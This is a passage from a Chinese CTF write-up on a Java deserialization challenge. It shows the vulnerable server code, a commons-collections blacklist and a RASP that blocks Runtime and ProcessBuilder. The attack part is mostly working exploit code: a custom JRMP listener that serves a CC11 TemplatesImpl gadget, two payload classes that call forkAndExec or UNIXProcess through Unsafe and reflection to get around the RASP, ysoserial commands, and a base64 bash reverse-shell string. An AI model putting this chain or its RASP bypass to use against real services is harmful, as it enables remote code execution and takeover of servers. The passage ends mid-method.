com.sun.net.httpserver.HttpHandler;</span><br><span class="line">import com.sun.net.httpserver.HttpServer;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.OutputStream;</span><br><span class="line">import java.net.InetSocketAddress;</span><br><span class="line">import java.util.concurrent.Executor;</span><br><span class="line">public class Main &#123;</span><br><span class="line">    public Main() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        int port = 8081;</span><br><span class="line">        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);</span><br><span class="line">        server.createContext(&quot;/&quot;, new MyHandler());</span><br><span class="line">        server.setExecutor((Executor)null);</span><br><span class="line">        server.start();</span><br><span class="line">        System.out.println(&quot;Server is listening on port &quot; + port);</span><br><span class="line">    &#125;</span><br><span class="line">    static class MyHandler implements HttpHandler &#123;</span><br><span class="line">        MyHandler() &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        public void handle(HttpExchange exchange) throws IOException &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                InputStream requestBody = exchange.getRequestBody();</span><br><span class="line">                ByteArrayOutputStream buffer = new ByteArrayOutputStream();</span><br><span class="line">                byte[] data = new byte[1024];</span><br><span class="line">                int nRead;</span><br><span class="line">                while((nRead = requestBody.read(data, 0, data.length)) != -1) &#123;</span><br><span class="line">                    buffer.write(data, 0, nRead);</span><br><span class="line">                &#125;</span><br><span class="line">                buffer.flush();</span><br><span class="line">                String base64Param = buffer.toString();</span><br><span class="line">                SerializeUtil.base64deserial(base64Param);</span><br><span class="line">                String response = &quot;Data received successfully&quot;;</span><br><span class="line">                exchange.sendResponseHeaders(200, (long)response.length());</span><br><span class="line">                OutputStream os = exchange.getResponseBody();</span><br><span class="line">                os.write(response.getBytes());</span><br><span class="line">                os.close();</span><br><span class="line">            &#125; catch (Exception var9) &#123;</span><br><span class="line">                String response = &quot;Error&quot;;</span><br><span class="line">                exchange.sendResponseHeaders(200, (long)response.length());</span><br><span class="line">                OutputStream os = exchange.getResponseBody();</span><br><span class="line">                os.write(response.getBytes());</span><br><span class="line">                os.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>包内只有cc依赖，但cc被过滤了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//</span><br><span class="line">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="line">// (powered by FernFlower decompiler)</span><br><span class="line">//</span><br><span class="line">package com.nocc.ctf;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectStreamClass;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.Set;</span><br><span class="line">public class SafeObjectInputStream extends ObjectInputStream &#123;</span><br><span class="line">    private static final Set&lt;String&gt; BLACKLIST = new HashSet();</span><br><span class="line">    public SafeObjectInputStream(InputStream is) throws Exception &#123;</span><br><span class="line">        super(is);</span><br><span class="line">    &#125;</span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass input) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        if (input.getName().contains(&quot;org.apache.commons.collections&quot;)) &#123;</span><br><span class="line">            throw new SecurityException(&quot;Hacker!!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return super.resolveClass(input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看ezRasp.jar，没写过rasp但是两个监视器大概能看得出来把Runtime和ProcessBuilder给过滤了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34908308/1728112237479-c334cfec-0fcc-4cf8-a5ec-4daf48f39902.png"></p><p>因为没有依赖所以尝试使用JRMPClient进行攻击，也算是二次反序列化的思想，这样就可以绕过对cc的限制，调试的时候尝试把Rasp关了，是可以打通的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1199 CommonsCollections6 &#x27;bash -c &#123;echo,vps&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure><p>那现在的问题就是cc链中使用的runtime被过滤了，我们其实只需要换一个Listener的payload就可以，这里使用forkandexec绕过</p><p>gadget直接用yso是没问题的，生成了以后post传过去</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar JRMPClient &quot;vps&quot;|base64</span><br></pre></td></tr></table></figure><p>接下来是绕过runtime，本来的想法是自己写一个cc链继续用yso就好了，但是发现yso的体系比较完善，牵一发而动全身，只改payload是不太行了，只能重新写一下listener</p><p>这里选用了cc11链因为java版本171有些链子有点限制，而且还要绕过runtime需要能加载字节码的</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34908308/1728112237808-20be2519-052d-484e-ae56-6f330a0c2f9c.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package demo;</span><br><span class="line">import java.io.BufferedInputStream;</span><br><span class="line">import java.io.BufferedOutputStream;</span><br><span class="line">import java.io.DataInputStream;</span><br><span class="line">import java.io.DataOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.ObjectStreamClass;</span><br><span class="line">import java.io.OutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.*;</span><br><span class="line">import java.rmi.MarshalException;</span><br><span class="line">import java.rmi.server.ObjID;</span><br><span class="line">import java.rmi.server.UID;</span><br><span class="line">import java.util.Arrays;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import javax.net.ServerSocketFactory;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import sun.rmi.transport.TransportConstants;</span><br><span class="line">/**</span><br><span class="line"> * Generic JRMP listener</span><br><span class="line"> *</span><br><span class="line"> * Opens up an JRMP listener that will deliver the specified payload to any</span><br><span class="line"> * client connecting to it and making a call.</span><br><span class="line"> *</span><br><span class="line"> * @author mbechler</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">@SuppressWarnings ( &#123;</span><br><span class="line">        &quot;restriction&quot;</span><br><span class="line">&#125; )</span><br><span class="line">public class listener implements Runnable &#123;</span><br><span class="line">    private int port;</span><br><span class="line">    private Object payloadObject;</span><br><span class="line">    private ServerSocket ss;</span><br><span class="line">    private Object waitLock = new Object();</span><br><span class="line">    private boolean exit;</span><br><span class="line">    private boolean hadConnection;</span><br><span class="line">    private URL classpathUrl;</span><br><span class="line">    public listener(int port, Object payloadObject ) throws NumberFormatException, IOException &#123;</span><br><span class="line">        this.port = port;</span><br><span class="line">        this.payloadObject = payloadObject;</span><br><span class="line">        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);</span><br><span class="line">    &#125;</span><br><span class="line">    public static final void main ( final String[] args ) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            int port = 1199;</span><br><span class="line">            ClassPool pool = ClassPool.getDefault();</span><br><span class="line">            CtClass ctClass = pool.get(runtime.class.getName());</span><br><span class="line">            byte[] code = ctClass.toBytecode();</span><br><span class="line">            TemplatesImpl templates=new TemplatesImpl();</span><br><span class="line">            setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);</span><br><span class="line">            setFieldValue(templates,&quot;_name&quot;,&quot;runtime&quot;);</span><br><span class="line">            setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">            InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);</span><br><span class="line">            Map map=new HashMap();</span><br><span class="line">            Map lazymap= LazyMap.decorate(map,transformer);</span><br><span class="line">            TiedMapEntry tiedMapEntry=new TiedMapEntry(lazymap,templates);</span><br><span class="line">            Map hashMap=new HashMap();</span><br><span class="line">            hashMap.put(&quot;value&quot;,&quot;value&quot;);</span><br><span class="line">            Field table=HashMap.class.getDeclaredField(&quot;table&quot;);</span><br><span class="line">            table.setAccessible(true);</span><br><span class="line">            Object[] t=(Object[]) table.get(hashMap);</span><br><span class="line">            Object node=t[0];</span><br><span class="line">            for(int i=0;i&lt;t.length;i++)&#123;</span><br><span class="line">                if(t[i]==null)&#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                node=t[i];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            Field key=node.getClass().getDeclaredField(&quot;key&quot;);</span><br><span class="line">            key.setAccessible(true);</span><br><span class="line">            key.set(node,tiedMapEntry);</span><br><span class="line">            System.err.println(&quot;* Opening JRMP listener on &quot; + port);</span><br><span class="line">            listener c = new listener(port, hashMap);</span><br><span class="line">            c.run();</span><br><span class="line">        &#125;</span><br><span class="line">        catch ( Exception e ) &#123;</span><br><span class="line">            System.err.println(&quot;Listener error&quot;);</span><br><span class="line">            e.printStackTrace(System.err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public void run () &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Socket s = null;</span><br><span class="line">            try &#123;</span><br><span class="line">                while ( !this.exit &amp;&amp; ( s = this.ss.accept() ) != null ) &#123;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        s.setSoTimeout(5000);</span><br><span class="line">                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();</span><br><span class="line">                        System.err.println(&quot;Have connection from &quot; + remote);</span><br><span class="line">                        InputStream is = s.getInputStream();</span><br><span class="line">                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);</span><br><span class="line">                        // Read magic (or HTTP wrapper)</span><br><span class="line">                        bufIn.mark(4);</span><br><span class="line">                        DataInputStream in = new DataInputStream(bufIn);</span><br><span class="line">                        int magic = in.readInt();</span><br><span class="line">                        short version = in.readShort();</span><br><span class="line">                        if ( magic != TransportConstants.Magic || version != TransportConstants.Version ) &#123;</span><br><span class="line">                            s.close();</span><br><span class="line">                            continue;</span><br><span class="line">                        &#125;</span><br><span class="line">                        OutputStream sockOut = s.getOutputStream();</span><br><span class="line">                        BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);</span><br><span class="line">                        DataOutputStream out = new DataOutputStream(bufOut);</span><br><span class="line">                        byte protocol = in.readByte();</span><br><span class="line">                        switch ( protocol ) &#123;</span><br><span class="line">                            case TransportConstants.StreamProtocol:</span><br><span class="line">                                out.writeByte(TransportConstants.ProtocolAck);</span><br><span class="line">                                if ( remote.getHostName() != null ) &#123;</span><br><span class="line">                                    out.writeUTF(remote.getHostName());</span><br><span class="line">                                &#125; else &#123;</span><br><span class="line">                                    out.writeUTF(remote.getAddress().toString());</span><br><span class="line">                                &#125;</span><br><span class="line">                                out.writeInt(remote.getPort());</span><br><span class="line">                                out.flush();</span><br><span class="line">                                in.readUTF();</span><br><span class="line">                                in.readInt();</span><br><span class="line">                            case TransportConstants.SingleOpProtocol:</span><br><span class="line">                                doMessage(s, in, out, this.payloadObject);</span><br><span class="line">                                break;</span><br><span class="line">                            default:</span><br><span class="line">                            case TransportConstants.MultiplexProtocol:</span><br><span class="line">                                System.err.println(&quot;Unsupported protocol&quot;);</span><br><span class="line">                                s.close();</span><br><span class="line">                                continue;</span><br><span class="line">                        &#125;</span><br><span class="line">                        bufOut.flush();</span><br><span class="line">                        out.flush();</span><br><span class="line">                    &#125;</span><br><span class="line">                    catch ( InterruptedException e ) &#123;</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line">                    catch ( Exception e ) &#123;</span><br><span class="line">                        e.printStackTrace(System.err);</span><br><span class="line">                    &#125;</span><br><span class="line">                    finally &#123;</span><br><span class="line">                        System.err.println(&quot;Closing connection&quot;);</span><br><span class="line">                        s.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            finally &#123;</span><br><span class="line">                if ( s != null ) &#123;</span><br><span class="line">                    s.close();</span><br><span class="line">                &#125;</span><br><span class="line">                if ( this.ss != null ) &#123;</span><br><span class="line">                    this.ss.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch ( SocketException e ) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace(System.err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    private void doMessage ( Socket s, DataInputStream in, DataOutputStream out, Object payload ) throws Exception &#123;</span><br><span class="line">        System.err.println(&quot;Reading message...&quot;);</span><br><span class="line">        int op = in.read();</span><br><span class="line">        switch ( op ) &#123;</span><br><span class="line">            case TransportConstants.Call:</span><br><span class="line">                // service incoming RMI call</span><br><span class="line">                doCall(in, out, payload);</span><br><span class="line">                break;</span><br><span class="line">            case TransportConstants.Ping:</span><br><span class="line">                // send ack for ping</span><br><span class="line">                out.writeByte(TransportConstants.PingAck);</span><br><span class="line">                break;</span><br><span class="line">            case TransportConstants.DGCAck:</span><br><span class="line">                UID u = UID.read(in);</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                throw new IOException(&quot;unknown transport op &quot; + op);</span><br><span class="line">        &#125;</span><br><span class="line">        s.close();</span><br><span class="line">    &#125;</span><br><span class="line">    private void doCall ( DataInputStream in, DataOutputStream out, Object payload ) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(in) &#123;</span><br><span class="line">            @Override</span><br><span class="line">            protected Class&lt;?&gt; resolveClass ( ObjectStreamClass desc ) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">                if ( &quot;[Ljava.rmi.server.ObjID;&quot;.equals(desc.getName())) &#123;</span><br><span class="line">                    return ObjID[].class;</span><br><span class="line">                &#125; else if (&quot;java.rmi.server.ObjID&quot;.equals(desc.getName())) &#123;</span><br><span class="line">                    return ObjID.class;</span><br><span class="line">                &#125; else if ( &quot;java.rmi.server.UID&quot;.equals(desc.getName())) &#123;</span><br><span class="line">                    return UID.class;</span><br><span class="line">                &#125;</span><br><span class="line">                throw new IOException(&quot;Not allowed to read object&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        ObjID read;</span><br><span class="line">        try &#123;</span><br><span class="line">            read = ObjID.read(ois);</span><br><span class="line">        &#125;</span><br><span class="line">        catch ( java.io.IOException e ) &#123;</span><br><span class="line">            throw new MarshalException(&quot;unable to read objID&quot;, e);</span><br><span class="line">        &#125;</span><br><span class="line">        if ( read.hashCode() == 2 ) &#123;</span><br><span class="line">            ois.readInt(); // method</span><br><span class="line">            ois.readLong(); // hash</span><br><span class="line">            System.err.println(&quot;Is DGC call for &quot; + Arrays.toString((ObjID[])ois.readObject()));</span><br><span class="line">        &#125;</span><br><span class="line">        System.err.println(&quot;Sending return with payload for obj &quot; + read);</span><br><span class="line">        out.writeByte(TransportConstants.Return);// transport op</span><br><span class="line">        ObjectOutputStream oos = new MarshalOutputStream(out, this.classpathUrl);</span><br><span class="line">        oos.writeByte(TransportConstants.ExceptionalReturn);</span><br><span class="line">        new UID().write(oos);</span><br><span class="line">        BadAttributeValueExpException ex = new BadAttributeValueExpException(null);</span><br><span class="line">        setFieldValue(ex, &quot;val&quot;, payload);</span><br><span class="line">        oos.writeObject(ex);</span><br><span class="line">        oos.flush();</span><br><span class="line">        out.flush();</span><br><span class="line">        this.hadConnection = true;</span><br><span class="line">        synchronized ( this.waitLock ) &#123;</span><br><span class="line">            this.waitLock.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    static final class MarshalOutputStream extends ObjectOutputStream &#123;</span><br><span class="line">        private URL sendUrl;</span><br><span class="line">        public MarshalOutputStream (OutputStream out, URL u) throws IOException &#123;</span><br><span class="line">            super(out);</span><br><span class="line">            this.sendUrl = u;</span><br><span class="line">        &#125;</span><br><span class="line">        @Override</span><br><span class="line">        protected void annotateClass ( Class&lt;?&gt; cl ) throws IOException &#123;</span><br><span class="line">            if ( this.sendUrl != null ) &#123;</span><br><span class="line">                writeObject(this.sendUrl.toString());</span><br><span class="line">            &#125; else if ( ! ( cl.getClassLoader() instanceof URLClassLoader) ) &#123;</span><br><span class="line">                writeObject(null);</span><br><span class="line">            &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                URL[] us = ( (URLClassLoader) cl.getClassLoader() ).getURLs();</span><br><span class="line">                String cb = &quot;&quot;;</span><br><span class="line">                for ( URL u : us ) &#123;</span><br><span class="line">                    cb += u.toString();</span><br><span class="line">                &#125;</span><br><span class="line">                writeObject(cb);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @Override</span><br><span class="line">        protected void annotateProxyClass ( Class&lt;?&gt; cl ) throws IOException &#123;</span><br><span class="line">            annotateClass(cl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object object,String name,Object value)&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Field field=object.getClass().getDeclaredField(name);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            field.set(object,value);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cc11需要的runtime，这里用了unsafe反射</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package demo;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import sun.misc.Unsafe;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import static java.lang.System.out;</span><br><span class="line">public class runtime extends AbstractTranslet &#123;</span><br><span class="line">    public runtime() throws Exception &#123;</span><br><span class="line">        super();</span><br><span class="line">        //String[] strs = &#123;&quot;calc&quot;&#125;;</span><br><span class="line">        String[] strs = &#123;&quot;bash&quot;,&quot;-c&quot;,&quot;&#123;echo,vps&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;;</span><br><span class="line">        if (strs != null) &#123;</span><br><span class="line">            Field theUnsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);</span><br><span class="line">            theUnsafeField.setAccessible(true);</span><br><span class="line">            Unsafe unsafe = (Unsafe) theUnsafeField.get(null);</span><br><span class="line">            Class processClass = null;</span><br><span class="line">            try &#123;</span><br><span class="line">                processClass = Class.forName(&quot;java.lang.UNIXProcess&quot;);</span><br><span class="line">            &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                processClass = Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            Object processObject = unsafe.allocateInstance(processClass);</span><br><span class="line">            // Convert arguments to a contiguous block; it&#x27;s easier to do</span><br><span class="line">            // memory management in Java than in C.</span><br><span class="line">            byte[][] args = new byte[strs.length - 1][];</span><br><span class="line">            int      size = args.length; // For added NUL bytes</span><br><span class="line">            for (int i = 0; i &lt; args.length; i++) &#123;</span><br><span class="line">                args[i] = strs[i + 1].getBytes();</span><br><span class="line">                size += args[i].length;</span><br><span class="line">            &#125;</span><br><span class="line">            byte[] argBlock = new byte[size];</span><br><span class="line">            int    i        = 0;</span><br><span class="line">            for (byte[] arg : args) &#123;</span><br><span class="line">                System.arraycopy(arg, 0, argBlock, i, arg.length);</span><br><span class="line">                i += arg.length + 1;</span><br><span class="line">                // No need to write NUL bytes explicitly</span><br><span class="line">            &#125;</span><br><span class="line">            int[] envc                 = new int[1];</span><br><span class="line">            int[] std_fds              = new int[]&#123;-1, -1, -1&#125;;</span><br><span class="line">            Field launchMechanismField = processClass.getDeclaredField(&quot;launchMechanism&quot;);</span><br><span class="line">            Field helperpathField      = processClass.getDeclaredField(&quot;helperpath&quot;);</span><br><span class="line">            launchMechanismField.setAccessible(true);</span><br><span class="line">            helperpathField.setAccessible(true);</span><br><span class="line">            Object launchMechanismObject = launchMechanismField.get(processObject);</span><br><span class="line">            byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);</span><br><span class="line">            int ordinal = (int) launchMechanismObject.getClass().getMethod(&quot;ordinal&quot;).invoke(launchMechanismObject);</span><br><span class="line">            Method forkMethod = processClass.getDeclaredMethod(&quot;forkAndExec&quot;, new Class[]&#123;</span><br><span class="line">                    int.class, byte[].class, byte[].class, byte[].class, int.class,</span><br><span class="line">                    byte[].class, int.class, byte[].class, int[].class, boolean.class</span><br><span class="line">            &#125;);</span><br><span class="line">            forkMethod.setAccessible(true);// 设置访问权限</span><br><span class="line">            int pid = (int) forkMethod.invoke(processObject, new Object[]&#123;</span><br><span class="line">                    ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,</span><br><span class="line">                    null, envc[0], null, std_fds, false</span><br><span class="line">            &#125;);</span><br><span class="line">            // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span><br><span class="line">            Method initStreamsMethod = processClass.getDeclaredMethod(&quot;initStreams&quot;, int[].class);</span><br><span class="line">            initStreamsMethod.setAccessible(true);</span><br><span class="line">            initStreamsMethod.invoke(processObject, std_fds);</span><br><span class="line">            // 获取本地执行结果的输入流</span><br><span class="line">            Method getInputStreamMethod = processClass.getMethod(&quot;getInputStream&quot;);</span><br><span class="line">            getInputStreamMethod.setAccessible(true);</span><br><span class="line">            InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);</span><br><span class="line">            ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">            int                   a    = 0;</span><br><span class="line">            byte[]                b    = new byte[1024];</span><br><span class="line">            while ((a = in.read(b)) != -1) &#123;</span><br><span class="line">                baos.write(b, 0, a);</span><br><span class="line">            &#125;</span><br><span class="line">            out.println(baos.toString());</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    private Object toCString(String s) &#123;</span><br><span class="line">        if (s == null)</span><br><span class="line">            return null;</span><br><span class="line">        byte[] bytes  = s.getBytes();</span><br><span class="line">        byte[] result = new byte[bytes.length + 1];</span><br><span class="line">        System.arraycopy(bytes, 0,</span><br><span class="line">                result, 0,</span><br><span class="line">                bytes.length);</span><br><span class="line">        result[result.length - 1] = (byte) 0;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>反射UNIXProcess&#x2F;ProcessImpl也同样是可行的，但要注意要符合cc链需要的格式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package demo;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import sun.misc.Unsafe;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import static java.lang.System.out;</span><br><span class="line">public class runtime extends AbstractTranslet &#123;</span><br><span class="line">    public runtime() throws Exception &#123;</span><br><span class="line">        super();</span><br><span class="line">        String[] str = &#123;&quot;bash&quot;,&quot;-c&quot;,&quot;&#123;echo,vps&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;;</span><br><span class="line">        if (str != null) &#123;</span><br><span class="line">            InputStream in     = start(str);</span><br><span class="line">            String      result = inputStreamToString(in, &quot;UTF-8&quot;);</span><br><span class="line">            out.println(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">            out.println(result);</span><br><span class="line">            out.println(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    String inputStreamToString(InputStream in, String charset) throws IOException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (charset == null) &#123;</span><br><span class="line">                charset = &quot;UTF-8&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            ByteArrayOutputStream out = new ByteArrayOutputStream();</span><br><span class="line">            int                   a   = 0;</span><br><span class="line">            byte[]                b   = new byte[1024];</span><br><span class="line">            while ((a = in.read(b)) != -1) &#123;</span><br><span class="line">                out.write(b, 0, a);</span><br><span class="line">            &#125;</span><br><span class="line">            return new String(out.toByteArray());</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw e;</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            if (in != null)</span><br><span class="line">                in.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    InputStream start(String[] strs) throws Exception &#123;</span><br><span class="line">        // java.lang.UNIXProcess</span><br><span class="line">        String unixClass = new String(new byte[]&#123;106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115&#125;);</span><br><span class="line">        // java.lang.ProcessImpl</span><br><span class="line">        String processClass = new String(new byte[]&#123;106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 80, 114, 111, 99, 101, 115, 115, 73, 109, 112, 108&#125;);</span><br><span class="line">        Class clazz = null;</span><br><span class="line">        // 反射创建UNIXProcess或者ProcessImpl</span><br><span class="line">        try &#123;</span><br><span class="line">            clazz = Class.forName(unixClass);</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            clazz = Class.forName(processClass);</span><br><span class="line">        &#125;</span><br><span class="line">        // 获取UNIXProcess或者ProcessImpl的构造方法</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructors()[0];</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        assert strs != null &amp;&amp; strs.length &gt; 0;</span><br><span class="line">        // Convert arguments to a contiguous block; it&#x27;s easier to do</span><br><span class="line">        // memory management in Java than in C.</span><br><span class="line">        byte[][] args = new byte[strs.length - 1][];</span><br><span class="line">        int size = args.length; // For added NUL bytes</span><br><span class="line">        for (int i = 0; i &lt; args.length; i++) &#123;</span><br><span class="line">            args[i] = strs[i + 1].getBytes();</span><br><span class="line">            size += args[i].length;</span><br><span class="line">        &#125;</span><br><span class="line">        byte[] argBlock = new byte[size];</span><br><span class="line">        int    i        = 0;</span><br><span class="line">        for (byte[] arg : args) &#123;</span><br><span class="line">            System.arraycopy(arg, 0, argBlock, i, arg.length);</span><br><span class="line">            i += arg.length + 1;</span><br><span class="line">            // No need to write NUL bytes explicitly</span><br><span class="line">        &#125;</span><br><span class="line">        int[] envc    = new int[1];</span><br><span class="line">        int[] std_fds = new int[]&#123;-1, -1, -1&#125;;</span><br><span class="line">        FileInputStream f0 = null;</span><br><span class="line">        FileOutputStream f1 = null;</span><br><span class="line">        FileOutputStream f2 = null;</span><br><span class="line">        // In theory, close() can throw IOException</span><br><span class="line">        // (although it is rather unlikely to happen here)</span><br><span class="line">        try &#123;</span><br><span class="line">            if (f0 != null) f0.close();</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                if (f1 != null) f1.close();</span><br><span class="line">            &#125; finally &#123;</span><br><span class="line">                if (f2 != null) f2.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // 创建UNIXProcess或者ProcessImpl实例</span><br><span class="line">        Object object = constructor.newInstance(</span><br><span class="line">                toCString(strs[0]), argBlock, args.length,</span><br><span class="line">                null, envc[0], null, std_fds, false</span><br><span class="line">        );</span><br><span class="line">        // 获取命令执行的InputStream</span><br><span class="line">        Method inMethod = object.getClass().getDeclaredMethod(&quot;getInputStream&quot;);</span><br><span class="line">        inMethod.setAccessible(true);</span><br><span class="line">        return (InputStream) inMethod.invoke(object);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] 